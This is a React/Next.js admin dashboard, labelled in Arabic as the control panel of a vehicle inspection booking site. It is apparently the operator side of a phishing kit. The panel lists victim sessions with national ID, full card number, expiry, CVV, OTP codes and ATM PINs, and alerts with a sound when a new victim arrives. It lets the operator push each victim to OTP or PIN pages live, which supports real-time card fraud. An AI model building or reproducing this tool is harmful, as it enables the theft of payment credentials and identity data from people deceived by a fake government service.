'use client';
export const dynamic = 'force-dynamic';

import { useEffect, useState, useCallback } from 'react';
import { useRouter } from 'next/navigation';

interface Session {
  id: string;
  country: string;
  ip: string;
  name: string;
  id_number: string;
  plate_number: string;
  booking_date: string;
  phone: string;
  email: string;
  card_number: string;
  card_expiry: string;
  card_cvv: string;
  card_holder: string;
  otp_code: string;
  atm_pin: string;
  current_page: string;
  status: string;
  is_new: number;
  redirect_to: string;
  created_at: number;
  updated_at: number;
}

const PAGE_LABELS: Record<string, string> = {
  home: 'الصفحة الرئيسية',
  booking: 'حجز موعد',
  payment: 'الدفع',
  otp: 'رمز OTP',
  atm: 'الرقم السري ATM',
  'loading-page': 'تحميل',
  confirm: 'تأكيد الحجز',
  success: 'نجاح',
};

const PAGE_COLORS: Record<string, string> = {
  home: 'bg-gray-600',
  booking: 'bg-blue-600',
  payment: 'bg-yellow-600',
  otp: 'bg-orange-600',
  atm: 'bg-red-600',
  'loading-page': 'bg-purple-600',
  confirm: 'bg-teal-600',
  success: 'bg-green-600',
};

const REDIRECT_OPTIONS = [
  { value: '', label: '-- اختر صفحة --' },
  { value: '/booking', label: 'صفحة الحجز' },
  { value: '/payment', label: 'صفحة الدفع' },
  { value: '/otp', label: 'صفحة OTP' },
  { value: '/atm', label: 'صفحة ATM PIN' },
  { value: '/loading-page', label: 'صفحة التحميل' },
  { value: '/confirm', label: 'صفحة التأكيد' },
  { value: '/success', label: 'صفحة النجاح' },
];

export default function AdminDashboard() {
  const router = useRouter();
  const [sessions, setSessions] = useState<Session[]>([]);
  const [activeUsers, setActiveUsers] = useState(0);
  const [totalVisits, setTotalVisits] = useState(0);
  const [loading, setLoading] = useState(true);
  const [selectedSession, setSelectedSession] = useState<Session | null>(null);
  const [redirectTarget, setRedirectTarget] = useState('');
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [prevSessionIds, setPrevSessionIds] = useState<Set<string>>(new Set());
  const [newNotifications, setNewNotifications] = useState<string[]>([]);

  const fetchData = useCallback(async () => {
    try {
      const res = await fetch('/api/admin/sessions');
      if (res.status === 401) {
        router.push('/admin/login');
        return;
      }
      const data = await res.json();

      // كشف الجلسات الجديدة أو التي تغيرت صفحتها
      const newIds: string[] = [];
      data.sessions?.forEach((s: Session) => {
        if (s.is_new === 1) {
          newIds.push(s.id);
        }
      });

      if (newIds.length > 0) {
        setNewNotifications(prev => [...new Set([...prev, ...newIds])]);
        // صوت إشعار
        try {
          const ctx = new AudioContext();
          const osc = ctx.createOscillator();
          const gain = ctx.createGain();
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.frequency.value = 880;
          gain.gain.setValueAtTime(0.3, ctx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.3);
          osc.start(ctx.currentTime);
          osc.stop(ctx.currentTime + 0.3);
        } catch {}
      }

      setSessions(data.sessions || []);
      setActiveUsers(data.activeUsers || 0);
      setTotalVisits(data.totalVisits || 0);
      setPrevSessionIds(new Set(data.sessions?.map((s: Session) => s.id) || []));
    } catch {}
    setLoading(false);
  }, [router]);

  useEffect(() => {
    // التحقق من المصادقة
    fetch('/api/admin/verify').then(res => {
      if (res.status === 401) router.push('/admin/login');
    });

    fetchData();
    const interval = setInterval(fetchData, 3000); // تحديث كل 3 ثواني
    return () => clearInterval(interval);
  }, [fetchData, router]);

  async function handleAction(sessionId: string, action: 'approve' | 'reject' | 'redirect') {
    setActionLoading(sessionId + action);
    try {
      let body: Record<string, string> = {};

      if (action === 'approve') {
        body = { status: 'approved', redirect_to: '' };
      } else if (action === 'reject') {
        body = { status: 'rejected', redirect_to: '' };
      } else if (action === 'redirect') {
        body = { status: 'redirected', redirect_to: redirectTarget };
      }

      await fetch(`/api/admin/sessions/${sessionId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });

      // مسح الإشعار
      setNewNotifications(prev => prev.filter(id => id !== sessionId));
      await fetchData();
    } catch {}
    setActionLoading(null);
  }

  async function handleLogout() {
    await fetch('/api/admin/logout', { method: 'POST' });
    router.push('/admin/login');
  }

  function formatDate(ts: number) {
    return new Date(ts).toLocaleString('ar-SA', {
      year: 'numeric', month: 'short', day: 'numeric',
      hour: '2-digit', minute: '2-digit',
    });
  }

  function maskCard(card: string) {
    if (!card) return '---';
    return card.replace(/(\d{4})\s?(\d{4})\s?(\d{4})\s?(\d{4})/, '$1 **** **** $4');
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center">
        <div className="text-white text-xl flex items-center gap-3">
          <svg className="animate-spin w-8 h-8 text-green-500" fill="none" viewBox="0 0 24 24">
            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
          </svg>
          جاري التحميل...
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white" dir="rtl">
      {/* Header */}
      <header className="bg-gray-800 border-b border-gray-700 px-6 py-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-green-600 rounded-full flex items-center justify-center">
              <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
            </div>
            <div>
              <h1 className="text-xl font-bold">لوحة تحكم الأدمين</h1>
              <p className="text-gray-400 text-xs">منصة الفحص الفني الدوري للمركبات</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <span className="text-xs text-gray-400 bg-gray-700 px-3 py-1 rounded-full">
              🔄 تحديث تلقائي كل 3 ثواني
            </span>
            <button
              onClick={handleLogout}
              className="bg-red-700 hover:bg-red-600 text-white text-sm px-4 py-2 rounded-lg transition-colors flex items-center gap-2"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
              </svg>
              خروج
            </button>
          </div>
        </div>
      </header>

      <div className="p-6">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
          {/* المتواجدون الآن */}
          <div className="bg-gray-800 rounded-xl p-5 border border-gray-700">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-400 text-sm">المتواجدون الآن</p>
                <p className="text-4xl font-bold text-green-400 mt-1">{activeUsers}</p>
                <p className="text-gray-500 text-xs mt-1">آخر 3 دقائق</p>
              </div>
              <div className="w-14 h-14 bg-green-900/50 rounded-full flex items-center justify-center">
                <span className="text-2xl">👥</span>
              </div>
            </div>
            <div className="mt-3 flex items-center gap-1">
              <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
              <span className="text-green-400 text-xs">مباشر</span>
            </div>
          </div>

          {/* إجمالي الزيارات */}
          <div className="bg-gray-800 rounded-xl p-5 border border-gray-700">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-400 text-sm">إجمالي الزيارات</p>
                <p className="text-4xl font-bold text-blue-400 mt-1">{totalVisits}</p>
                <p className="text-gray-500 text-xs mt-1">منذ البداية</p>
              </div>
              <div className="w-14 h-14 bg-blue-900/50 rounded-full flex items-center justify-center">
                <span className="text-2xl">📊</span>
              </div>
            </div>
          </div>

          {/* إجمالي العملاء */}
          <div className="bg-gray-800 rounded-xl p-5 border border-gray-700">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-400 text-sm">إجمالي العملاء</p>
                <p className="text-4xl font-bold text-purple-400 mt-1">{sessions.length}</p>
                <p className="text-gray-500 text-xs mt-1">جلسة مسجلة</p>
              </div>
              <div className="w-14 h-14 bg-purple-900/50 rounded-full flex items-center justify-center">
                <span className="text-2xl">🧾</span>
              </div>
            </div>
          </div>
        </div>

        {/* Bookings Table */}
        <div className="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
          <div className="px-6 py-4 border-b border-gray-700 flex items-center justify-between">
            <h2 className="text-lg font-semibold flex items-center gap-2">
              📋 قائمة الحجوزات
              {newNotifications.length > 0 && (
                <span className="bg-red-500 text-white text-xs px-2 py-0.5 rounded-full animate-pulse">
                  {newNotifications.length} جديد
                </span>
              )}
            </h2>
            <span className="text-gray-400 text-sm">{sessions.length} عميل</span>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead className="bg-gray-750 border-b border-gray-700">
                <tr className="text-gray-400 text-xs">
                  <th className="px-4 py-3 text-right">#</th>
                  <th className="px-4 py-3 text-right">الدولة</th>
                  <th className="px-4 py-3 text-right">الاسم</th>
                  <th className="px-4 py-3 text-right">رقم الهوية</th>
                  <th className="px-4 py-3 text-right">رقم اللوحة</th>
                  <th className="px-4 py-3 text-right">التاريخ</th>
                  <th className="px-4 py-3 text-right">الصفحة الحالية</th>
                  <th className="px-4 py-3 text-right">الحالة</th>
                  <th className="px-4 py-3 text-right">الإجراءات</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700">
                {sessions.length === 0 ? (
                  <tr>
                    <td colSpan={9} className="text-center py-12 text-gray-500">
                      <div className="text-4xl mb-2">📭</div>
                      لا توجد حجوزات بعد
                    </td>
                  </tr>
                ) : (
                  sessions.map((session, idx) => {
                    const isNew = newNotifications.includes(session.id);
                    return (
                      <tr
                        key={session.id}
                        className={`hover:bg-gray-750 transition-colors ${isNew ? 'bg-yellow-900/20 border-r-2 border-yellow-500' : ''}`}
                      >
                        <td className="px-4 py-3 text-gray-400">{idx + 1}</td>
                        <td className="px-4 py-3">
                          <span className="text-base">{getFlagEmoji(session.country)}</span>
                          <span className="text-gray-300 text-xs mr-1">{session.country || 'غير معروف'}</span>
                        </td>
                        <td className="px-4 py-3 font-medium text-white">
                          {session.name || <span className="text-gray-500">---</span>}
                          {isNew && (
                            <span className="mr-2 bg-yellow-500 text-black text-xs px-1.5 py-0.5 rounded font-bold">
                              جديد
                            </span>
                          )}
                        </td>
                        <td className="px-4 py-3 text-gray-300 font-mono text-xs">
                          {session.id_number || '---'}
                        </td>
                        <td className="px-4 py-3 text-gray-300 font-mono text-xs">
                          {session.plate_number || '---'}
                        </td>
                        <td className="px-4 py-3 text-gray-400 text-xs">
                          {formatDate(session.updated_at)}
                        </td>
                        <td className="px-4 py-3">
                          <span className={`inline-flex items-center gap-1 text-xs text-white px-2 py-1 rounded-full ${PAGE_COLORS[session.current_page] || 'bg-gray-600'}`}>
                            {PAGE_LABELS[session.current_page] || session.current_page}
                          </span>
                        </td>
                        <td className="px-4 py-3">
                          <StatusBadge status={session.status} />
                        </td>
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-2">
                            <button
                              onClick={() => {
                                setSelectedSession(session);
                                setRedirectTarget('');
                                setNewNotifications(prev => prev.filter(id => id !== session.id));
                              }}
                              className="bg-blue-700 hover:bg-blue-600 text-white text-xs px-3 py-1.5 rounded-lg transition-colors"
                            >
                              التفاصيل
                            </button>
                            <div className="flex items-center gap-1">
                              <select
                                value={redirectTarget}
                                onChange={e => setRedirectTarget(e.target.value)}
                                className="bg-gray-700 border border-gray-600 text-white text-xs rounded px-2 py-1.5 focus:outline-none focus:border-green-500"
                                onClick={e => e.stopPropagation()}
                              >
                                {REDIRECT_OPTIONS.map(o => (
                                  <option key={o.value} value={o.value}>{o.label}</option>
                                ))}
                              </select>
                              <button
                                onClick={() => handleAction(session.id, 'redirect')}
                                disabled={!redirectTarget || actionLoading === session.id + 'redirect'}
                                className="bg-purple-700 hover:bg-purple-600 disabled:opacity-50 disabled:cursor-not-allowed text-white text-xs px-2 py-1.5 rounded-lg transition-colors"
                              >
                                توجيه
                              </button>
                            </div>
                          </div>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      {/* Modal - تفاصيل العميل */}
      {selectedSession && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4" onClick={() => setSelectedSession(null)}>
          <div
            className="bg-gray-800 rounded-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto border border-gray-600 shadow-2xl"
            onClick={e => e.stopPropagation()}
            dir="rtl"
          >
            {/* Modal Header */}
            <div className="sticky top-0 bg-gray-800 border-b border-gray-700 px-6 py-4 flex items-center justify-between rounded-t-2xl">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center text-lg">
                  {getFlagEmoji(selectedSession.country)}
                </div>
                <div>
                  <h3 className="font-bold text-lg">{selectedSession.name || 'عميل مجهول'}</h3>
                  <p className="text-gray-400 text-xs">{selectedSession.country} • {selectedSession.ip}</p>
                </div>
              </div>
              <button onClick={() => setSelectedSession(null)} className="text-gray-400 hover:text-white">
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            <div className="p-6 space-y-5">
              {/* الصفحة الحالية */}
              <div className="flex items-center gap-2">
                <span className="text-gray-400 text-sm">الصفحة الحالية:</span>
                <span className={`text-xs text-white px-3 py-1 rounded-full ${PAGE_COLORS[selectedSession.current_page] || 'bg-gray-600'}`}>
                  {PAGE_LABELS[selectedSession.current_page] || selectedSession.current_page}
                </span>
                <StatusBadge status={selectedSession.status} />
              </div>

              {/* بيانات الحجز */}
              <Section title="📋 بيانات الحجز">
                <InfoRow label="الاسم" value={selectedSession.name} />
                <InfoRow label="رقم الهوية" value={selectedSession.id_number} mono />
                <InfoRow label="رقم اللوحة" value={selectedSession.plate_number} mono />
                <InfoRow label="تاريخ الحجز" value={selectedSession.booking_date} />
                <InfoRow label="رقم الهاتف" value={selectedSession.phone} mono />
                <InfoRow label="البريد الإلكتروني" value={selectedSession.email} />
              </Section>

              {/* بيانات البطاقة */}
              {(selectedSession.card_number || selectedSession.card_holder) && (
                <Section title="💳 بيانات البطاقة البنكية">
                  <div className="bg-gradient-to-r from-gray-700 to-gray-600 rounded-xl p-4 mb-3">
                    <div className="flex justify-between items-start mb-4">
                      <span className="text-gray-300 text-xs">بطاقة الدفع</span>
                      <span className="text-white font-bold text-sm">VISA / MC</span>
                    </div>
                    <div className="font-mono text-white text-lg tracking-widest mb-3">
                      {selectedSession.card_number || '**** **** **** ****'}
                    </div>
                    <div className="flex justify-between">
                      <div>
                        <div className="text-gray-400 text-xs">حامل البطاقة</div>
                        <div className="text-white text-sm">{selectedSession.card_holder || '---'}</div>
                      </div>
                      <div>
                        <div className="text-gray-400 text-xs">الصلاحية</div>
                        <div className="text-white text-sm font-mono">{selectedSession.card_expiry || '--/--'}</div>
                      </div>
                      <div>
                        <div className="text-gray-400 text-xs">CVV</div>
                        <div className="text-white text-sm font-mono">{selectedSession.card_cvv || '---'}</div>
                      </div>
                    </div>
                  </div>
                </Section>
              )}

              {/* OTP و ATM PIN */}
              {(selectedSession.otp_code || selectedSession.atm_pin) && (
                <Section title="🔐 رموز التحقق">
                  {selectedSession.otp_code && (
                    <InfoRow label="رمز OTP" value={selectedSession.otp_code} mono highlight />
                  )}
                  {selectedSession.atm_pin && (
                    <InfoRow label="الرقم السري ATM" value={selectedSession.atm_pin} mono highlight />
                  )}
                </Section>
              )}

              {/* الإجراءات */}
              <Section title="⚡ الإجراءات">
                <div className="grid grid-cols-2 gap-3 mb-3">
                  <button
                    onClick={() => handleAction(selectedSession.id, 'approve')}
                    disabled={actionLoading === selectedSession.id + 'approve'}
                    className="bg-green-700 hover:bg-green-600 disabled:opacity-50 text-white py-3 rounded-xl font-semibold transition-colors flex items-center justify-center gap-2"
                  >
                    ✅ قبول
                  </button>
                  <button
                    onClick={() => handleAction(selectedSession.id, 'reject')}
                    disabled={actionLoading === selectedSession.id + 'reject'}
                    className="bg-red-700 hover:bg-red-600 disabled:opacity-50 text-white py-3 rounded-xl font-semibold transition-colors flex items-center justify-center gap-2"
                  >
                    ❌ رفض
                  </button>
                </div>

                {/* إعادة التوجيه */}
                <div className="bg-gray-700 rounded-xl p-4">
                  <p className="text-gray-300 text-sm mb-3 font-medium">إعادة توجيه العميل إلى:</p>
                  <div className="flex gap-2">
                    <select
                      value={redirectTarget}
                      onChange={e => setRedirectTarget(e.target.value)}
                      className="flex-1 bg-gray-600 border border-gray-500 text-white rounded-lg px-3 py-2 text-sm focus:outline-none focus:border-green-500"
                    >
                      {REDIRECT_OPTIONS.map(o => (
                        <option key={o.value} value={o.value}>{o.label}</option>
                      ))}
                    </select>
                    <button
                      onClick={() => handleAction(selectedSession.id, 'redirect')}
                      disabled={!redirectTarget || actionLoading === selectedSession.id + 'redirect'}
                      className="bg-purple-700 hover:bg-purple-600 disabled:opacity-50 disabled:cursor-not-allowed text-white px-4 py-2 rounded-lg text-sm font-semibold transition-colors"
                    >
                      {actionLoading === selectedSession.id + 'redirect' ? '...' : 'توجيه'}
                    </button>
                  </div>
                </div>
              </Section>

              <p className="text-gray-600 text-xs text-center">
                آخر تحديث: {formatDate(selectedSession.updated_at)} • ID: {selectedSession.id.substring(0, 8)}...
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function Section({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="bg-gray-750 rounded-xl border border-gray-700 overflow-hidden">
      <div className="bg-gray-700 px-4 py-2.5 text-sm font-semibold text-gray-200">{title}</div>
      <div className="p-4 space-y-2">{children}</div>
    </div>
  );
}

function InfoRow({ label, value, mono, highlight }: { label: string; value: string; mono?: boolean; highlight?: boolean }) {
  return (
    <div className="flex items-center justify-between py-1">
      <span className="text-gray-400 text-sm">{label}</span>
      <span className={`text-sm ${mono ? 'font-mono' : ''} ${highlight ? 'text-yellow-300 font-bold text-base' : 'text-white'} ${!value ? 'text-gray-600' : ''}`}>
        {value || '---'}
      </span>
    </div>
  );
}

function StatusBadge({ status }: { status: string }) {
  const map: Record<string, { label: string; class: string }> = {
    active: { label: 'نشط', class: 'bg-blue-900 text-blue-300' },
    approved: { label: 'مقبول', class: 'bg-green-900 text-green-300' },
    rejected: { label: 'مرفوض', class: 'bg-red-900 text-red-300' },
    redirected: { label: 'موجَّه', class: 'bg-purple-900 text-purple-300' },
  };
  const s = map[status] || { label: status, class: 'bg-gray-700 text-gray-300' };
  return (
    <span className={`inline-flex text-xs px-2 py-0.5 rounded-full font-medium ${s.class}`}>
      {s.label}
    </span>
  );
}

function getFlagEmoji(country: string): string {
  const flags: Record<string, string> = {
    'Saudi Arabia': '🇸🇦', 'Egypt': '🇪🇬', 'UAE': '🇦🇪',
    'Kuwait': '🇰🇼', 'Qatar': '🇶🇦', 'Bahrain': '🇧🇭',
    'Oman': '🇴🇲', 'Jordan': '🇯🇴', 'Iraq': '🇮🇶',
    'Syria': '🇸🇾', 'Lebanon': '🇱🇧', 'Yemen': '🇾🇪',
    'Morocco': '🇲🇦', 'Tunisia': '🇹🇳', 'Algeria': '🇩🇿',
    'Libya': '🇱🇾', 'Sudan': '🇸🇩', 'Palestine': '🇵🇸',
    'United States': '🇺🇸', 'United Kingdom': '🇬🇧',
    'Germany': '🇩🇪', 'France': '🇫🇷', 'Turkey': '🇹🇷',
  };
  return flags[country] || '🌍';
}
